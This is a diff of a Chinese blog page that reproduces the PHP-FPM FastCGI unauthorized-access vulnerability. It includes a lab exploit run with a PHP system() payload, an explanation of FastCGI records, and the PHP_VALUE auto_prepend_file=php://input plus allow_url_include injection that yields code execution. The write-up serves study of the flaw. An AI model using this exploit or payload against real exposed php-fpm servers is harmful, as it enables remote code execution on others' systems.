@@ -4,17 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hexo">
-    <meta name="description" content="
-
-
-
-PHP-FPM Fastcgi 未授权访问漏洞
-
-漏洞复现
-脚本地址:
+    <meta name="keywords" content="PHP-FPM Fastcgi 未授权访问漏洞, Hexo">
+    <meta name="description" content="漏洞复现脚本地址:
 https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75
-┌──(root㉿kali)-">
+123456┌──(root㉿kali)-[~/Desktop/tools/php-cve">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -26,7 +19,7 @@ https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hexo</title>
+    <title>PHP-FPM Fastcgi 未授权访问漏洞 | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -343,12 +336,12 @@ https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title"></h1>
+                    <h1 class="description center-align post-title">PHP-FPM Fastcgi 未授权访问漏洞</h1>
                 </div>
             </div>
         </div>
@@ -376,6 +369,23 @@ https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                渗透测试
+                            </a>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                漏洞复现
+                            </a>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Php/" class="post-category">
+                                Php
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -405,145 +415,45 @@ https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <!doctype html>
-<html>
-<head>
-<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
-<title>PHP-FPM Fastcgi 未授权访问漏洞</title>
-</head>
-<body><h3 id='漏洞复现'>漏洞复现</h3>
-<p>脚本地址:</p>
-<p><a href='https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75' target='_blank' class='url'>https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
-<pre><code>┌──(root㉿kali)-[~/Desktop/tools/php-cve]
-└─# python fpm.py &quot;192.168.121.140&quot; -c &quot;&lt;?system(&#39;id&#39;);?&gt;&quot; -p &quot;9000&quot; /usr/local/lib/php/System.php
-X-Powered-By: PHP/8.1.1
-Content-type: text/html; charset=UTF-8
+                <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>脚本地址:</p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tools/php-cve]</span><br><span class="line">└─# python fpm.py &quot;192.168.121.140&quot; -c &quot;&lt;?system(&#x27;id&#x27;);?&gt;&quot; -p &quot;9000&quot; /usr/local/lib/php/System.php</span><br><span class="line">X-Powered-By: PHP/8.1.1</span><br><span class="line">Content-type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
 
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-</code></pre>
 <p>该脚本包含4个参数，需要手动设置目标服务器下具有的php文件用于执行代码</p>
-<p><img src="E:\笔记软件\笔记\渗透测试\漏洞复现\Php\fpm.png" referrerpolicy="no-referrer" alt="fpm"></p>
-<h3 id='原理分析'>原理分析</h3>
-<h4 id='fastcgi'>Fastcgi</h4>
-<p>FastCGI（Fast Common Gateway Interface）是一种用于处理动态内容的协议，它可以提高Web服务器和外部程序之间的通信效率。与传统的CGI协议相比，FastCGI能够更高效地处理动态请求，并且具有更好的性能和可伸缩性。FastCGI通过在Web服务器和外部程序之间建立一个持久的连接，可以重用进程或线程来处理多个请求</p>
-<pre><code>FastCGI的工作流程如下：
-Web服务器接收到客户端的请求。
-Web服务器将请求转发给FastCGI进程管理器。
-FastCGI进程管理器选择一个可用的FastCGI应用程序进程。
-Web服务器将请求数据发送给FastCGI应用程序进程。
-FastCGI应用程序进程处理请求并生成响应数据。
-FastCGI应用程序进程将响应数据发送回Web服务器。
-Web服务器将响应数据返回给客户端。
-</code></pre>
-<p><strong>Record</strong></p>
-<pre><code class='language-c' lang='c'>typedef struct &#123;
-  /* Header */
-  unsigned char version; // 版本
-  unsigned char type; // 本次record的类型
-  unsigned char requestIdB1; // 本次record对应的请求id
-  unsigned char requestIdB0;
-  unsigned char contentLengthB1; // body体的大小
-  unsigned char contentLengthB0;
-  unsigned char paddingLength; // 额外块大小
-  unsigned char reserved; 
+<p><img src="E:\笔记软件\笔记\渗透测试\漏洞复现\Php\fpm.png" alt="fpm"></p>
+<h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><h4 id="Fastcgi"><a href="#Fastcgi" class="headerlink" title="Fastcgi"></a>Fastcgi</h4><p>FastCGI（Fast Common Gateway Interface）是一种用于处理动态内容的协议，它可以提高Web服务器和外部程序之间的通信效率。与传统的CGI协议相比，FastCGI能够更高效地处理动态请求，并且具有更好的性能和可伸缩性。FastCGI通过在Web服务器和外部程序之间建立一个持久的连接，可以重用进程或线程来处理多个请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FastCGI的工作流程如下：</span><br><span class="line">Web服务器接收到客户端的请求。</span><br><span class="line">Web服务器将请求转发给FastCGI进程管理器。</span><br><span class="line">FastCGI进程管理器选择一个可用的FastCGI应用程序进程。</span><br><span class="line">Web服务器将请求数据发送给FastCGI应用程序进程。</span><br><span class="line">FastCGI应用程序进程处理请求并生成响应数据。</span><br><span class="line">FastCGI应用程序进程将响应数据发送回Web服务器。</span><br><span class="line">Web服务器将响应数据返回给客户端。</span><br></pre></td></tr></table></figure>
 
-  /* Body */
-  unsigned char contentData[contentLength];
-  unsigned char paddingData[paddingLength];
-&#125; FCGI_Record;
-</code></pre>
+<p><strong>Record</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="comment">/* Header */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> version; <span class="comment">// 版本</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> type; <span class="comment">// 本次record的类型</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> requestIdB1; <span class="comment">// 本次record对应的请求id</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> requestIdB0;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> contentLengthB1; <span class="comment">// body体的大小</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> contentLengthB0;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> paddingLength; <span class="comment">// 额外块大小</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> reserved; </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Body */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> contentData[contentLength];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure>
+
 <p>fastcgi通过record头中的contentLength来获取需要从tcp数据流中需要读取的数据大小</p>
 <p><strong>Type</strong></p>
-<p><img src="E:\笔记软件\笔记\渗透测试\漏洞复现\Php\record-type.png" referrerpolicy="no-referrer" alt="record-type"></p>
+<p><img src="E:\笔记软件\笔记\渗透测试\漏洞复现\Php\record-type.png" alt="record-type"></p>
 <p>fastcgi中的type有上述图中的7种，需要注意的是第四种，也是本漏洞所利用的点，当接收到type为4时，将record的body解析为key-value的形式存储在环境变量中</p>
-<pre><code class='language-c' lang='c'>typedef struct &#123;
-  unsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */
-  unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */
-  unsigned char nameData[nameLength];
-  unsigned char valueData[valueLength];
-&#125; FCGI_NameValuePair11;
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB0;  <span class="comment">/* nameLengthB0  &gt;&gt; 7 == 0 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB0; <span class="comment">/* valueLengthB0 &gt;&gt; 7 == 0 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameData[nameLength];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair11;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB0;  <span class="comment">/* nameLengthB0  &gt;&gt; 7 == 0 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB3; <span class="comment">/* valueLengthB3 &gt;&gt; 7 == 1 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB2;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB1;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB0;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameData[nameLength];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueData[valueLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair14;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB3;  <span class="comment">/* nameLengthB3  &gt;&gt; 7 == 1 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB2;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB1;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB0;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB0; <span class="comment">/* valueLengthB0 &gt;&gt; 7 == 0 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameData[nameLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair41;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB3;  <span class="comment">/* nameLengthB3  &gt;&gt; 7 == 1 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB2;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB1;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameLengthB0;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB3; <span class="comment">/* valueLengthB3 &gt;&gt; 7 == 1 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB2;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB1;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueLengthB0;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> nameData[nameLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> valueData[valueLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair44;</span><br></pre></td></tr></table></figure>
 
-typedef struct &#123;
-  unsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */
-  unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */
-  unsigned char valueLengthB2;
-  unsigned char valueLengthB1;
-  unsigned char valueLengthB0;
-  unsigned char nameData[nameLength];
-  unsigned char valueData[valueLength
-          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];
-&#125; FCGI_NameValuePair14;
-
-typedef struct &#123;
-  unsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */
-  unsigned char nameLengthB2;
-  unsigned char nameLengthB1;
-  unsigned char nameLengthB0;
-  unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */
-  unsigned char nameData[nameLength
-          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];
-  unsigned char valueData[valueLength];
-&#125; FCGI_NameValuePair41;
-
-typedef struct &#123;
-  unsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */
-  unsigned char nameLengthB2;
-  unsigned char nameLengthB1;
-  unsigned char nameLengthB0;
-  unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */
-  unsigned char valueLengthB2;
-  unsigned char valueLengthB1;
-  unsigned char valueLengthB0;
-  unsigned char nameData[nameLength
-          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];
-  unsigned char valueData[valueLength
-          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];
-&#125; FCGI_NameValuePair44;
-</code></pre>
-<ol start='' >
+<ol>
 <li>key、value均小于128字节，用<code>FCGI_NameValuePair11</code></li>
 <li>key大于128字节，value小于128字节，用<code>FCGI_NameValuePair41</code></li>
 <li>key小于128字节，value大于128字节，用<code>FCGI_NameValuePair14</code></li>
 <li>key、value均大于128字节，用<code>FCGI_NameValuePair44</code></li>
-
 </ol>
-<h4 id='php-fpm'>PHP-FPM</h4>
-<p>php-fpm是一种fastcgi进程管理器，当Web服务器接收到对PHP文件的请求时，它通过FastCGI协议将请求转发给PHP-FPM。PHP-FPM将请求分配给进程池中的一个可用的PHP工作进程来处理。一旦PHP脚本的执行完成，响应将被发送回Web服务器，由其传递给客户端。</p>
-<p>当用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>时，若web目录是/var/www/html，则nginx会将请求解析为key_value</p>
-<pre><code class='language-nginx' lang='nginx'>&#123;
-    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI/1.0&#39;,
-    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,
-    &#39;SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php&#39;,
-    &#39;SCRIPT_NAME&#39;: &#39;/index.php&#39;,
-    &#39;QUERY_STRING&#39;: &#39;?a=1&amp;b=2&#39;,
-    &#39;REQUEST_URI&#39;: &#39;/index.php?a=1&amp;b=2&#39;,
-    &#39;DOCUMENT_ROOT&#39;: &#39;/var/www/html&#39;,
-    &#39;SERVER_SOFTWARE&#39;: &#39;php/fcgiclient&#39;,
-    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,
-    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,
-    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,
-    &#39;SERVER_PORT&#39;: &#39;80&#39;,
-    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,
-    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP/1.1&#39;
-&#125;
-</code></pre>
-<p>SCRIPT_FILENAME参数指向绝对路径的php文件，即告诉服务器需要执行哪个文件</p>
-<h4 id='任意代码执行'>任意代码执行</h4>
-<p>当pgp-fpm的9000端口暴露在公网上时，我们可以自行构造fastcgi协议与fpm进行通信，前提条件是我们所选的SCRIPT_FILENAME需要在目标服务器上存在，并且是绝对路径，所以通常选择的都是php安装源所拥有的默认php文件，例如/usr/local/lib/php/PEAR.php</p>
-<p>怎么让目标php文件执行我们的命令，这就需要用到php的配置项auto_prepend_file<code>和</code>auto_append_file</p>
-<pre><code>auto_prepend_file（自动前置文件）：该指令用于指定一个文件路径，该文件将在每个PHP脚本执行之前自动包含。这意味着在执行脚本的代码之前，会先执行auto_prepend_file中指定的文件中的代码。这个文件通常用于定义全局变量、函数或者执行一些必要的初始化操作。
+<h4 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h4><p>php-fpm是一种fastcgi进程管理器，当Web服务器接收到对PHP文件的请求时，它通过FastCGI协议将请求转发给PHP-FPM。PHP-FPM将请求分配给进程池中的一个可用的PHP工作进程来处理。一旦PHP脚本的执行完成，响应将被发送回Web服务器，由其传递给客户端。</p>
+<p>当用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>时，若web目录是&#x2F;var&#x2F;www&#x2F;html，则nginx会将请求解析为key_value</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-auto_append_file（自动后置文件）：该指令用于指定一个文件路径，该文件将在每个PHP脚本执行之后自动包含。这意味着在执行完脚本的代码后，会执行auto_append_file中指定的文件中的代码。这个文件通常用于执行一些清理操作、记录日志或者输出一些额外的内容。
-</code></pre>
+<p>SCRIPT_FILENAME参数指向绝对路径的php文件，即告诉服务器需要执行哪个文件</p>
+<h4 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h4><p>当pgp-fpm的9000端口暴露在公网上时，我们可以自行构造fastcgi协议与fpm进行通信，前提条件是我们所选的SCRIPT_FILENAME需要在目标服务器上存在，并且是绝对路径，所以通常选择的都是php安装源所拥有的默认php文件，例如&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php</p>
+<p>怎么让目标php文件执行我们的命令，这就需要用到php的配置项auto_prepend_file<code>和</code>auto_append_file</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file（自动前置文件）：该指令用于指定一个文件路径，该文件将在每个PHP脚本执行之前自动包含。这意味着在执行脚本的代码之前，会先执行auto_prepend_file中指定的文件中的代码。这个文件通常用于定义全局变量、函数或者执行一些必要的初始化操作。</span><br><span class="line"></span><br><span class="line">auto_append_file（自动后置文件）：该指令用于指定一个文件路径，该文件将在每个PHP脚本执行之后自动包含。这意味着在执行完脚本的代码后，会执行auto_append_file中指定的文件中的代码。这个文件通常用于执行一些清理操作、记录日志或者输出一些额外的内容。</span><br></pre></td></tr></table></figure>
+
 <p>通过指定auto_prepend_file为<code>php://input</code>在每个文件执行前包含post提交的内容(需要开启allow_url_include启动远程文件包含选项)</p>
 <p>auto_prepend_file的值通过php-fpm中的两个环境变量来设置PHP_VALUE<code>和</code>PHP_ADMIN_VALUE；对这两个环境变量进行设置</p>
-<pre><code class='language-c' lang='c'>    &#39;PHP_VALUE&#39;: &#39;auto_prepend_file = php://input&#39;,
-    &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include = On&#39;
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br></pre></td></tr></table></figure>
+
 <p>与请求一同发送，就可以执行post提交的任意参数</p>
-<p>&nbsp;</p>
-</body>
-</html>
+
                 
             </div>
             <hr/>
@@ -687,13 +597,13 @@ auto_append_file（自动后置文件）：该指令用于指定一个文件路�
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/09/03/shen-tou-ce-shi/lou-dong-fu-xian/php/php-fpm-fastcgi-wei-shou-quan-fang-wen-lou-dong/">
+                <a href="/2023/09/03/shen-tou-ce-shi/lou-dong-fu-xian/php/php-8.1.0-dev-kai-fa-ban-ben-hou-men-shi-jian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="PHP 8.1.0-dev 开发版本后门事件">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">PHP 8.1.0-dev 开发版本后门事件</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -708,8 +618,20 @@ auto_append_file（自动后置文件）：该指令用于指定一个文件路�
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            uu2fu3o
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
+                                </a>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Php/" class="post-category">
+                                    Php
+                                </a>
+                            
                             
                         </span>
                     </div>
@@ -724,13 +646,13 @@ auto_append_file（自动后置文件）：该指令用于指定一个文件路�
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/09/03/shen-tou-ce-shi/lou-dong-fu-xian/php/php-8.1.0-dev-kai-fa-ban-ben-hou-men-shi-jian/">
+                <a href="/2023/09/03/shen-tou-ce-shi/lou-dong-fu-xian/php/php-xdebug-dai-ma-zhi-xing/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="php-xdebug代码执行">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">php-xdebug代码执行</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -745,8 +667,20 @@ auto_append_file（自动后置文件）：该指令用于指定一个文件路�
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            uu2fu3o
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
+                                </a>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Php/" class="post-category">
+                                    Php
+                                </a>
+                            
                             
                         </span>
                     </div>
